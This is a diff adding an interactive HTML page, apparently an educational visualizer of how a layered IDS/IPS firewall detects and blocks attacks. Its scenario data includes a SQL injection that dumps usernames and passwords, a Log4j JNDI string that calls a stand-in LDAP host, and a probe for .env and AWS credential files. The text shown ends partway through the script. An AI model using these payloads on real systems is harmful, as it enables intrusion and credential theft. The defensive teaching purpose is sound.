@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Active IPS Firewall - Defense-in-Depth Visualizer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#f5f7fb; --ink:#0f172a; --ink2:#334155; --muted:#64748b; --line:#e3e8f1; --line2:#cbd5e5;
+  --blue:#2563eb; --blue-soft:#e9f0ff;
+  --green:#15803d; --green-soft:#e6f6ec;
+  --red:#dc2626; --red-soft:#fdeceb;
+  --amber:#b45309; --amber-soft:#fff2dc;
+  --violet:#6d28d9; --violet-soft:#f0eaff;
+  --fuchsia:#a21caf; --fuchsia-soft:#fae8ff;
+  --cyan:#0369a1; --cyan-soft:#e0f1fc;
+  --slate:#475569; --slate-soft:#eef1f6;
+  --shadow:0 1px 2px rgba(15,23,42,.05),0 8px 24px rgba(15,23,42,.06);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--ink);display:flex;flex-direction:column;overflow:hidden;-webkit-font-smoothing:antialiased}
+code,.mono{font-family:'JetBrains Mono',ui-monospace,monospace}
+svg.i{width:1em;height:1em;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex:none}
+button{font-family:inherit}
+
+.deck{flex:1;position:relative;min-height:0}
+.slide{position:absolute;inset:0;padding:24px 40px 12px;display:flex;flex-direction:column;opacity:0;pointer-events:none;transform:translateX(30px);transition:opacity .35s ease,transform .35s ease;overflow:auto}
+.slide.active{opacity:1;pointer-events:auto;transform:none}
+.slide.past{transform:translateX(-30px)}
+
+/* nav */
+.nav{height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;border-top:1px solid var(--line);background:#fff;flex:none}
+.btn{font:600 13.5px Inter,sans-serif;border:1px solid var(--line);background:#fff;color:var(--ink);padding:9px 16px;border-radius:10px;cursor:pointer;transition:.15s;display:inline-flex;align-items:center;gap:8px}
+.btn svg{font-size:16px}
+.btn:hover:not(:disabled){border-color:var(--line2);background:#f8faff}
+.btn.primary{background:var(--blue);border-color:var(--blue);color:#fff}
+.btn.primary:hover:not(:disabled){background:#1d4fd0;border-color:#1d4fd0}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn.sm{padding:6px 12px;font-size:12.5px;border-radius:99px}
+.navr{display:flex;gap:10px}
+.dots{display:flex;gap:7px;align-items:center}
+.dot-n{width:8px;height:8px;border-radius:99px;background:#d3dbe9;transition:.3s}
+.dot-n.on{width:26px;background:var(--blue)} .dot-n.done{background:#9bb8f3}
+kbd{background:#eaeff8;border:1px solid var(--line2);border-bottom-width:2px;padding:1px 6px;border-radius:5px;font:600 10.5px 'JetBrains Mono',monospace;color:var(--ink2)}
+
+/* shared */
+.h2{font-size:clamp(22px,2.4vw,30px);font-weight:800;letter-spacing:-.02em}
+.sub{color:var(--muted);margin-top:4px;font-size:14.5px}
+.pill{display:inline-flex;align-items:center;gap:7px;font:700 12.5px Inter;padding:6px 12px;border-radius:99px;background:var(--ts);color:var(--tc)}
+.seg{display:inline-flex;background:#e8edf6;border-radius:11px;padding:3px}
+.seg button{font:600 13px Inter;border:0;background:transparent;color:var(--muted);padding:7px 13px;border-radius:8px;cursor:pointer;transition:.15s;display:inline-flex;align-items:center;gap:7px}
+.seg button.on{background:#fff;box-shadow:0 1px 3px rgba(15,23,42,.18)}
+.seg button.on[data-v="block"]{color:var(--green)} .seg button.on[data-v="monitor"]{color:var(--amber)}
+.rico{width:36px;height:36px;border-radius:10px;display:grid;place-items:center;font-size:18px;background:var(--rs);color:var(--rc);flex:none}
+
+/* hero */
+.hero{margin:auto;text-align:center;max-width:940px}
+.eyebrow{display:inline-block;font:700 11.5px Inter;letter-spacing:.14em;text-transform:uppercase;color:var(--blue);background:var(--blue-soft);padding:6px 14px;border-radius:99px}
+.hero h1{font-size:clamp(32px,4.6vw,56px);line-height:1.06;letter-spacing:-.03em;margin:20px 0 14px;font-weight:800}
+.hero h1 span{color:var(--blue)}
+.hero p{color:var(--muted);font-size:clamp(15px,1.4vw,17.5px);max-width:700px;margin:0 auto;line-height:1.6}
+.flow{display:flex;justify-content:center;align-items:center;gap:8px;margin-top:34px;flex-wrap:wrap}
+.fl{display:flex;align-items:center;gap:8px;background:#fff;border:1px solid var(--line);border-radius:12px;padding:9px 13px;font-weight:600;font-size:12.5px}
+.fl .rico{width:26px;height:26px;border-radius:8px;font-size:14px}
+.flow .ar{color:#a6b3cb;font-size:16px;display:flex}
+.hint{font-size:12px;color:var(--muted);margin-top:30px;line-height:2}
+
+/* choose */
+.choose{flex:1;display:flex;flex-direction:column;justify-content:center;gap:18px;max-width:1120px;margin:0 auto;width:100%}
+.cgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.sc{position:relative;text-align:left;background:#fff;border:1.5px solid var(--line);border-radius:14px;padding:14px;cursor:pointer;color:inherit;display:flex;flex-direction:column;gap:9px;transition:.15s}
+.sc:hover{border-color:var(--line2);transform:translateY(-2px);box-shadow:var(--shadow)}
+.sc.sel{border-color:var(--tc);box-shadow:0 0 0 4px color-mix(in srgb,var(--tc) 15%,transparent)}
+.sc .top{display:flex;justify-content:space-between;align-items:center}
+.tag{font:700 10.5px Inter;letter-spacing:.06em;text-transform:uppercase;padding:3px 8px;border-radius:6px;background:var(--ts);color:var(--tc)}
+.sc h3{font-size:15px;line-height:1.25;letter-spacing:-.01em}
+.sc code{font-size:11.5px;color:var(--muted);background:#f3f5fa;padding:7px 9px;border-radius:8px;display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.modebar{display:flex;align-items:center;justify-content:space-between;gap:20px;background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px 18px;flex-wrap:wrap}
+.modebar b{font-size:14px} .modebar .d{display:block;color:var(--muted);font-size:12.5px;margin-top:3px;max-width:560px;line-height:1.45}
+
+/* simulation */
+#s2{padding:12px 28px 8px}
+.simhead{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.simhead .l,.simhead .r{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.stagewrap{flex:1;min-height:250px;position:relative;margin:10px 0;background:#fff;border:1px solid var(--line);border-radius:18px;overflow:hidden;
+  background-image:radial-gradient(#e3e9f3 1px,transparent 1px);background-size:22px 22px}
+.canvas{position:absolute;left:0;top:0;width:1200px;height:580px;transform-origin:0 0}
+svg.edges{position:absolute;inset:0;width:1200px;height:580px;overflow:visible}
+.edge{fill:none;stroke:#cfd7e6;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;transition:stroke .4s}
+.edge.on{stroke-width:4}
+.elabel{position:absolute;font:700 10.5px Inter;background:#fff;border:1px solid var(--line);color:var(--muted);padding:2px 8px;border-radius:99px;transform:translate(-50%,-50%);white-space:nowrap}
+
+.node{position:absolute;width:168px;height:76px;margin:-38px 0 0 -84px;background:#fff;border:2px solid var(--line);border-radius:14px;padding:0 10px;display:flex;align-items:center;gap:9px;box-shadow:0 3px 10px rgba(15,23,42,.06);transition:.35s;--tc:var(--slate);--ts:var(--slate-soft)}
+.node .rico{width:34px;height:34px;border-radius:9px;font-size:17px}
+.node .nt{min-width:0}
+.node b{display:block;font-size:12.5px;line-height:1.2}
+.node small{display:block;color:var(--muted);font-size:10.5px;margin-top:2px;line-height:1.25}
+.node.skipped{opacity:.38;border-style:dashed;box-shadow:none}
+.node.reached{border-color:var(--tc)}
+.node.out.reached{background:var(--ts)}
+.node.cur{box-shadow:0 0 0 5px color-mix(in srgb,var(--tc) 18%,transparent),0 8px 22px rgba(15,23,42,.12);transform:scale(1.05);z-index:3}
+.nbadge{position:absolute;top:-11px;right:10px;display:none;align-items:center;gap:4px;font:700 10.5px Inter;padding:3px 8px;border-radius:99px;background:var(--tc);color:#fff;white-space:nowrap}
+.nbadge svg{font-size:11px}
+.node.reached .nbadge{display:inline-flex}
+.node.reached{cursor:pointer}
+
+.dot{position:absolute;left:0;top:0;z-index:6;width:28px;height:28px;border-radius:50%;display:grid;place-items:center;color:#fff;font-size:14px;box-shadow:0 0 0 5px rgba(15,23,42,.08),0 6px 14px rgba(15,23,42,.3);pointer-events:none}
+.dot.safe{background:linear-gradient(135deg,#22c55e,#15803d)}
+.dot.atk{background:linear-gradient(135deg,#f87171,#b91c1c)}
+.dot.stopped{animation:shake .5s}
+@keyframes shake{0%,100%{margin-left:0}20%{margin-left:-7px}40%{margin-left:7px}60%{margin-left:-4px}80%{margin-left:4px}}
+
+.reqcard{position:absolute;left:24px;top:395px;width:700px;background:#fff;border:1px solid var(--line);border-radius:14px;padding:13px 18px;box-shadow:0 3px 10px rgba(15,23,42,.05)}
+.rq-h{font:700 10.5px Inter;letter-spacing:.1em;text-transform:uppercase;color:var(--muted)}
+.rq-name{font-size:17px;font-weight:800;margin:2px 0 6px;letter-spacing:-.01em}
+.rq-meta{display:flex;gap:16px;font-size:12px;color:var(--muted);margin-bottom:8px;flex-wrap:wrap}
+.rq-meta b{color:var(--ink);font-family:'JetBrains Mono',monospace;font-weight:700}
+.reqcard code{display:block;background:#0f172a;color:#e2e8f0;border-radius:8px;padding:8px 11px;font-size:12px;word-break:break-all}
+.legend{display:flex;gap:16px;margin-top:10px;font-size:11px;color:var(--muted);flex-wrap:wrap}
+.legend i{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:5px;vertical-align:-1px}
+
+.cap{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px 20px 14px;display:grid;grid-template-columns:1fr minmax(260px,440px);gap:24px;align-items:center;position:relative;overflow:hidden;flex:none}
+.cap .prog{position:absolute;left:0;top:0;height:3px;background:var(--blue);transition:width .5s;border-radius:0 3px 3px 0}
+.stepno{font:700 11px Inter;letter-spacing:.09em;text-transform:uppercase;color:var(--blue)}
+.captitle{font-size:18px;font-weight:800;margin:3px 0 4px;letter-spacing:-.015em}
+.capbody{color:var(--ink2);font-size:14px;line-height:1.55}
+.capbody code{font-size:12.5px;background:#eef2f9;padding:1px 6px;border-radius:5px}
+.chips{display:flex;flex-wrap:wrap;gap:7px;justify-content:flex-end}
+.chip{display:flex;flex-direction:column;gap:2px;background:var(--ts);border-radius:9px;padding:6px 11px}
+.chip span{font:700 9.5px Inter;text-transform:uppercase;letter-spacing:.07em;color:var(--muted)}
+.chip code{font-size:12.5px;font-weight:700;color:var(--tc)}
+
+/* result */
+.resgrid{flex:1;display:grid;grid-template-columns:5fr 6fr;gap:20px;align-items:center;max-width:1120px;margin:0 auto;width:100%;padding-top:10px}
+.verdict{border-radius:22px;padding:32px 28px;text-align:center;border:2px solid var(--tc);background:var(--ts)}
+.verdict .vi{width:58px;height:58px;border-radius:16px;margin:0 auto 12px;display:grid;place-items:center;font-size:28px;background:#fff;color:var(--tc)}
+.verdict .code{font-size:68px;font-weight:800;letter-spacing:-.04em;line-height:1;color:var(--tc)}
+.verdict .st{font-size:20px;font-weight:800;margin:10px 0 6px;color:var(--tc)}
+.verdict p{color:#475569;font-size:14px;line-height:1.55}
+.verdict .by{display:inline-flex;align-items:center;gap:6px;margin-top:14px;background:#fff;border-radius:99px;padding:6px 12px;font:700 12px Inter;color:var(--tc)}
+.rstack{display:flex;flex-direction:column;gap:14px}
+.card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:18px 20px}
+.card h4{font-size:13px;margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;gap:10px;color:var(--ink2)}
+.card h4 em{font:500 11px 'JetBrains Mono',monospace;font-style:normal;color:var(--muted);text-align:right}
+.trace{display:flex;flex-wrap:wrap;align-items:center;gap:6px}
+.ts{display:flex;align-items:center;gap:7px;background:var(--ts);color:var(--tc);border-radius:10px;padding:6px 10px;font-size:14px}
+.ts b{display:block;font-size:11.5px;line-height:1.1;color:var(--ink)} .ts span{display:block;font:700 10.5px Inter;margin-top:1px}
+.trace .ar{color:#a6b3cb;font-size:13px;display:flex}
+.cmprow{display:grid;grid-template-columns:1fr auto;gap:10px;align-items:center;padding:11px 14px;border-radius:11px;margin-bottom:8px;border:2px solid transparent;background:#f3f6fc}
+.cmprow.now{border-color:var(--blue);background:var(--blue-soft)}
+.cmprow b{font-size:13.5px;display:block} .cmprow .d{font-size:12px;color:var(--muted)}
+.badge{font:800 12px Inter;padding:6px 10px;border-radius:8px;background:var(--tc);color:#fff}
+.reactions{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
+
+/* tone helpers (kept last so they override component defaults) */
+.t-green{--tc:var(--green);--ts:var(--green-soft)} .t-red{--tc:var(--red);--ts:var(--red-soft)}
+.t-amber{--tc:var(--amber);--ts:var(--amber-soft)} .t-blue{--tc:var(--blue);--ts:var(--blue-soft)}
+.t-violet{--tc:var(--violet);--ts:var(--violet-soft)} .t-fuchsia{--tc:var(--fuchsia);--ts:var(--fuchsia-soft)}
+.t-cyan{--tc:var(--cyan);--ts:var(--cyan-soft)} .t-slate{--tc:var(--slate);--ts:var(--slate-soft)}
+.c-green{--rc:var(--green);--rs:var(--green-soft)} .c-slate{--rc:var(--slate);--rs:var(--slate-soft)}
+.c-blue{--rc:var(--blue);--rs:var(--blue-soft)} .c-violet{--rc:var(--violet);--rs:var(--violet-soft)}
+.c-fuchsia{--rc:var(--fuchsia);--rs:var(--fuchsia-soft)} .c-cyan{--rc:var(--cyan);--rs:var(--cyan-soft)}
+.c-amber{--rc:var(--amber);--rs:var(--amber-soft)} .c-red{--rc:var(--red);--rs:var(--red-soft)}
+
+@media (max-width:980px){
+  .slide{padding:16px 14px 8px}
+  .cgrid{grid-template-columns:1fr 1fr}
+  .cap{grid-template-columns:1fr;gap:10px} .chips{justify-content:flex-start}
+  .resgrid{grid-template-columns:1fr}
+  .nav{padding:0 12px} .dots{display:none}
+}
+@media (max-width:560px){ .cgrid{grid-template-columns:1fr} }
+</style>
+</head>
+<body>
+<div class="deck" id="deck">
+
+  <!-- SLIDE 0: HERO -->
+  <section class="slide" id="s0">
+    <div class="hero">
+      <span class="eyebrow">Interactive 4-Layer Walkthrough</span>
+      <h1>How the <span>Hybrid IDS/IPS</span> drops attacks</h1>
+      <p>Follow a network request through four defense layers (quarantine, signatures, flow ML and entropy/decoy inspection), then through risk scoring and the Block Mode gate.</p>
+      <div class="flow" id="miniflow"></div>
+      <div class="hint">
+        <kbd>Space</kbd> / <kbd>&rarr;</kbd> next &nbsp;&middot;&nbsp; <kbd>&larr;</kbd> back &nbsp;&middot;&nbsp; <kbd>P</kbd> auto-play &nbsp;&middot;&nbsp; <kbd>B</kbd> block mode &nbsp;&middot;&nbsp; <kbd>F</kbd> fullscreen &nbsp;&middot;&nbsp; <kbd>1</kbd>&ndash;<kbd>8</kbd> pick scenario
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 1: CHOOSE -->
+  <section class="slide" id="s1">
+    <div class="choose">
+      <div>
+        <div class="h2">Pick a request to simulate</div>
+        <div class="sub">One benign request and seven attacks, each designed to be caught by a different layer.</div>
+      </div>
+      <div class="cgrid" id="cgrid"></div>
+      <div class="modebar">
+        <div>
+          <b>Firewall mode</b>
+          <span class="d" id="modeDesc"></span>
+        </div>
+        <div class="seg" data-seg></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 2: SIMULATION -->
+  <section class="slide" id="s2">
+    <div class="simhead">
+      <div class="l">
+        <div class="h2" style="font-size:18px">Follow the request through the defense layers</div>
+        <span class="pill" id="scPill"></span>
+      </div>
+      <div class="r">
+        <button class="btn sm" id="autoPlayBtn"></button>
+        <div class="seg" data-seg></div>
+      </div>
+    </div>
+
+    <div class="stagewrap" id="stagewrap">
+      <div class="canvas" id="canvas">
+        <svg class="edges" id="edges" viewBox="0 0 1200 580"></svg>
+        <div id="labels"></div>
+        <div id="nodes"></div>
+        <div class="reqcard" id="reqcard"></div>
+        <div class="dot safe" id="packet"></div>
+      </div>
+    </div>
+
+    <div class="cap">
+      <div class="prog" id="prog"></div>
+      <div>
+        <div class="stepno" id="stepno"></div>
+        <div class="captitle" id="captitle"></div>
+        <div class="capbody" id="capbody"></div>
+      </div>
+      <div class="chips" id="chips"></div>
+    </div>
+  </section>
+
+  <!-- SLIDE 3: RESULT -->
+  <section class="slide" id="s3">
+    <div style="max-width:1120px;margin:0 auto;width:100%">
+      <div class="h2">Firewall verdict</div>
+      <div class="sub" id="resSub"></div>
+    </div>
+    <div class="resgrid">
+      <div class="verdict" id="verdict"></div>
+      <div class="rstack">
+        <div class="card"><h4><span>Inspection trace</span><em id="mitreBadge"></em></h4><div class="trace" id="trace"></div></div>
+        <div class="card">
+          <h4><span>Same request, both modes</span></h4>
+          <div id="cmpRows"></div>
+          <div class="reactions">
+            <button class="btn" id="flipBtn"></button>
+            <button class="btn" id="againBtn"></button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="nav">
+  <button class="btn" id="back"></button>
+  <div class="dots" id="dots"></div>
+  <div class="navr">
+    <button class="btn" id="fs" title="Fullscreen (F)"></button>
+    <button class="btn primary" id="next"></button>
+  </div>
+</div>
+
+<script>
+/* ---------- ICONS ---------- */
+const IC = {
+  terminal:'<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
+  lock:'<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+  search:'<circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>',
+  tree:'<circle cx="12" cy="5" r="2"/><circle cx="6" cy="19" r="2"/><circle cx="18" cy="19" r="2"/><path d="M12 7v4M12 11l-6 6M12 11l6 6"/>',
+  box:'<path d="M21 16V8a2 2 0 00-1-1.73l-7-4a2 2 0 00-2 0l-7 4A2 2 0 003 8v8a2 2 0 001 1.73l7 4a2 2 0 002 0l7-4A2 2 0 0021 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>',
+  bars:'<line x1="6" y1="20" x2="6" y2="12"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="18" y1="20" x2="18" y2="9"/>',
+  shield:'<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',
+  ban:'<circle cx="12" cy="12" r="10"/><line x1="4.9" y1="4.9" x2="19.1" y2="19.1"/>',
+  alert:'<path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>',
+  check:'<path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>',
+  minus:'<line x1="5" y1="12" x2="19" y2="12"/>',
+  pulse:'<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>',
+  zap:'<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
+  right:'<line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>',
+  left:'<line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>',
+  refresh:'<polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/>',
+  swap:'<polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/>',
+  eye:'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',
+  expand:'<polyline points="15 3 21 3 21 9"/><polyline points="9 21 3 21 3 15"/><line x1="21" y1="3" x2="14" y2="10"/><line x1="3" y1="21" x2="10" y2="14"/>',
+  play:'<polygon points="6 3 20 12 6 21 6 3"/>',
+  pause:'<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>',
+};
+const ic = n => `<svg class="i" viewBox="0 0 24 24">${IC[n] || ''}</svg>`;
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+const $ = id => document.getElementById(id);
+
+/* ---------- SCENARIOS ---------- */
+const SC = {
+  safe:{ name:'Normal Product Search', short:'Safe HTTP GET', payload:'GET /api/catalog/products?q=monitor HTTP/1.1', src_ip:'192.168.1.25', kind:'safe', layer:4, p:0.03, entropy:4.35, feats:'pps: 32 | IAT: 320ms | SYN: 1', port:80, mitre:'Legitimate Traffic' },
+  sqli:{ name:'SQL Injection Credential Dump', short:'SQLi Attack', payload:"id=1' UNION SELECT username, password FROM users --", src_ip:'203.0.113.55', kind:'atk', layer:1, sid:2010935, rule:'ET WEB_SERVER SQL Injection UNION SELECT', sev:90, conf:100, beh:60, ctx:80, score:87.8, port:80, mitre:'T1190 - Exploit Public-Facing Application' },
+  log4j:{ name:'Apache Log4j JNDI RCE', short:'Log4j RCE', payload:'${jndi:ldap://198.51.100.77:1389/ExploitPayload}', src_ip:'203.0.113.88', kind:'atk', layer:1, sid:2034647, rule:'ET EXPLOIT Apache Log4j RCE JNDI LDAP', sev:95, conf:100, beh:50, ctx:90, score:86.0, port:8080, mitre:'T1190 - Exploit Public-Facing Application' },
+  syn:{ name:'Zero-Day TCP SYN Flood', short:'SYN Flood', payload:'42-packet flood (220us IAT, zero L7 signature)', src_ip:'172.16.99.41', kind:'atk', layer:2, p:0.978, feats:'pps: 48,200 | SYN/PSH: 0.88 | IAT: 220us', sev:85, conf:98, beh:95, ctx:70, score:91.0, port:443, mitre:'T1498.001 - Network DoS: Direct Flood' },
+  slow:{ name:'Slowloris Connection Starvation', short:'Slowloris DoS', payload:'28-stream low-rate TCP starvation (120s keep-alive)', src_ip:'172.16.88.19', kind:'atk', layer:2, p:0.964, feats:'conns: 400 | IAT std: 42.1s | pps: 8', sev:85, conf:96, beh:100, ctx:75, score:92.0, port:80, mitre:'T1498.002 - Network DoS: Connection Exhaustion' },
+  shellcode:{ name:'Obfuscated XOR Shellcode Payload', short:'XOR Shellcode', payload:'POST /telemetry payload=q8f3Z9mK2xP7vL4nJ1wR8tY5u... (XOR)', src_ip:'198.51.100.212', kind:'atk', layer:3, entropy:6.11, rule:'Shannon Entropy H(X) = 6.11 bits/B (> 4.85 threshold)', sev:95, conf:100, beh:100, ctx:85, score:98.0, port:8080, mitre:'T1027 - Obfuscated/Compressed Files' },
+  honeypot:{ name:'Zero-Trust Honeypot Decoy Probe', short:'Honeypot Decoy', payload:'GET /.env & /.aws/credentials HTTP/1.1', src_ip:'198.51.100.99', kind:'atk', layer:3, rule:'Zero-Trust Honeypot Trap Triggered (/.env)', sev:100, conf:100, beh:100, ctx:100, score:100.0, port:80, mitre:'T1083 - File & Directory Discovery' },
+  quarantine:{ name:'Repeat Request from Quarantined IP', short:'Quarantined IP', payload:'GET /api/catalog HTTP/1.1 (Repeat IP 203.0.113.55)', src_ip:'203.0.113.55', kind:'atk', layer:0, rule:'Layer 0 Memory Cache: 0.01ms Fast Pre-Filter Drop', sev:85, conf:100, beh:80, ctx:70, score:85.0, port:80, mitre:'T1595 - Active Scanning (Repeat Offender)' }
+};
+const ORDER = ['safe','sqli','log4j','syn','slow','shellcode','honeypot','quarantine'];
+const CARD = {
+  safe:{tone:'green',tag:'Benign',snip:'GET /api/catalog/products?q=monitor'},
+  sqli:{tone:'blue',tag:'L1 · Suricata',snip:"' UNION SELECT username, password"},
+  log4j:{tone:'blue',tag:'L1 · Suricata',snip:'${jndi:ldap://…/ExploitPayload}'},
+  syn:{tone:'violet',tag:'L2 · Flow ML',snip:'48,200 pps · no signature'},
+  slow:{tone:'violet',tag:'L2 · Flow ML',snip:'400 conns · 8 pps · slow IAT'},
+  shellcode:{tone:'cyan',tag:'L3 · Entropy',snip:'H(X) = 6.11 bits/byte'},
+  honeypot:{tone:'cyan',tag:'L3 · Decoy',snip:'GET /.env · /.aws/credentials'},
+  quarantine:{tone:'fuchsia',tag:'L0 · Quarantine',snip:'Repeat IP 203.0.113.55'}
+};
+
+/* ---------- FLOWCHART GEOMETRY (canvas 1200 x 580) ----------
+   middle row  : ingress -> L0 -> L1 -> L2 -> L3     (detection layers)
+   top row     : risk scorer -> IPS gate -> outcomes  (hits travel up)
+   bottom row  : benign -> 200 allowed                (clean traffic travels down) */
+const W = 168, H = 76;
+const NODES = {
+  term:   {x:90,   y:300, i:'terminal', c:'slate',   t:'Traffic Ingress',    s:'Request arrives',          short:'Ingress'},
+  l0:     {x:290,  y:300, i:'lock',     c:'fuchsia', t:'L0 · Quarantine',    s:'0.01 ms IP pre-filter',    short:'L0'},
+  l1:     {x:490,  y:300, i:'search',   c:'blue',    t:'L1 · Signatures',    s:'Suricata rule SIDs',       short:'L1'},
+  l2:     {x:690,  y:300, i:'tree',     c:'violet',  t:'L2 · Flow ML',       s:'Random Forest, τ*=0.64',   short:'L2'},
+  l3:     {x:890,  y:300, i:'box',      c:'cyan',    t:'L3 · DPI & Decoys',  s:'Entropy H(X) & honeypot',  short:'L3'},
+  risk:   {x:490,  y:110, i:'bars',     c:'amber',   t:'Risk Scorer',        s:'4-factor weighted score',  short:'Risk'},
+  gate:   {x:690,  y:110, i:'shield',   c:'blue',    t:'IPS Gate',           s:'Block-mode enforcement',   short:'Gate'},
+  blocked:{x:1105, y:110, i:'ban',      c:'red',     t:'403 Blocked',        s:'Dropped before server',    short:'Blocked', out:1},
+  monitor:{x:1105, y:205, i:'eye',      c:'amber',   t:'200 Allowed',        s:'Block OFF, logged only',   short:'Allowed', out:1},
+  benign: {x:890,  y:490, i:'pulse',    c:'green',   t:'Benign Verified',    s:'Clean network flow',       short:'Benign'},
+  safe:   {x:1105, y:490, i:'check',    c:'green',   t:'200 Allowed',        s:'Normal business traffic',  short:'Allowed', out:1}
+};
+const EDGES = [
+  {a:'term',b:'l0',     pts:[[174,300],[202,300]]},
+  {a:'l0',  b:'l1',     pts:[[374,300],[402,300]]},
+  {a:'l1',  b:'l2',     pts:[[574,300],[602,300]]},
+  {a:'l2',  b:'l3',     pts:[[774,300],[802,300]]},
+  {a:'l0',  b:'blocked',pts:[[290,262],[290,30],[1105,30],[1105,68]]},
+  {a:'l1',  b:'risk',   pts:[[490,262],[490,152]]},
+  {a:'l2',  b:'risk',   pts:[[690,262],[690,205],[490,205],[490,152]]},
+  {a:'l3',  b:'risk',   pts:[[890,262],[890,205],[490,205],[490,152]]},
+  {a:'l3',  b:'benign', pts:[[890,338],[890,448]]},
+  {a:'benign',b:'safe', pts:[[974,490],[1015,490]]},
+  {a:'risk',b:'gate',   pts:[[574,110],[602,110]]},
+  {a:'gate',b:'blocked',pts:[[774,110],[1015,110]]},
+  {a:'gate',b:'monitor',pts:[[774,110],[998,110],[998,205],[1015,205]]}
+];
+const LABELS = [
+  ['threat detected',590,205], ['L0 quarantine drop · 0.01 ms',700,30], ['BLOCK ON',880,110],
+  ['OFF',998,158], ['clean',890,395]
+];
+const TH = {green:'#15803d', red:'#dc2626', amber:'#d97706', fuchsia:'#a21caf', slate:'#64748b', blue:'#2563eb', violet:'#6d28d9', cyan:'#0369a1'};
+
+function rpath(pts, r = 12){
+  let d = `M${pts[0][0]},${pts[0][1]}`;
+  for (let i = 1; i < pts.length - 1; i++){
+    const [px,py] = pts[i-1], [cx,cy] = pts[i], [nx,ny] = pts[i+1];
+    const l1 = Math.hypot(cx-px, cy-py), l2 = Math.hypot(nx-cx, ny-cy), rr = Math.min(r, l1/2, l2/2);
+    d += ` L${cx+(px-cx)/l1*rr},${cy+(py-cy)/l1*rr} Q${cx},${cy} ${cx+(nx-cx)/l2*rr},${cy+(ny-cy)/l2*rr}`;
+  }
+  const e = pts[pts.length-1];
+  return d + ` L${e[0]},${e[1]}`;
+}
+
+const S = { slide:0, step:0, k:null, block:true };
+const key = () => S.k || 'sqli';
+let autoPlayTimer = null, resultTimer = null, anim = 0, stopTimer = 0;
+let last = {k:null, b:null, step:-1}, dotPos = null;
+
+/* ---------- STEP BUILDER ---------- */
+const mk = (n, tone, icon, badge, title, body, chips) => ({n, tone, icon, badge, title, body, chips:chips || []});
+const sb = (o, sub, nodeT) => { o.sub = sub; if (nodeT) o.nodeT = nodeT; return o; };
+const ch = (k, v, t) => ({k, v, t:t || 'slate'});
+const featChips = c => c.feats.split(' | ').map(f => { const [a, b] = f.split(': '); return ch(a, b); });
+
+function buildSteps(){
+  const k = key(), c = SC[k], B = S.block, atk = c.kind === 'atk', st = [];
+
+  st.push(mk('term','slate','check','Received','Request arrives at the firewall',
+    `<b>${c.name}</b> from <code>${c.src_ip}</code> toward destination port <b>${c.port}</b>.`,
+    [ch('Source IP', c.src_ip), ch('Port', c.port), ch('Traffic', c.short)]));
+
+  if (!atk){
+    st.push(sb(mk('l0','green','check','Clean','Layer 0: IP is not quarantined',
+      `<code>${c.src_ip}</code> is looked up in the in-memory quarantine cache. No prior ban, so the request moves on to deep inspection.`,
+      [ch('Reputation','Clean','green')]), 'IP is clean'));
+    st.push(sb(mk('l1','green','check','Clean','Layer 1: no signature match',
+      'Suricata scans the payload against its rule set (SIDs 2010935 through 2034647). No SQL injection, RCE or exploit pattern matches.',
+      [ch('SIDs scanned','All','green')]), 'No rule matched'));
+    st.push(sb(mk('l2','green','check','Clean',`Layer 2: flow looks normal (p = ${c.p.toFixed(2)})`,
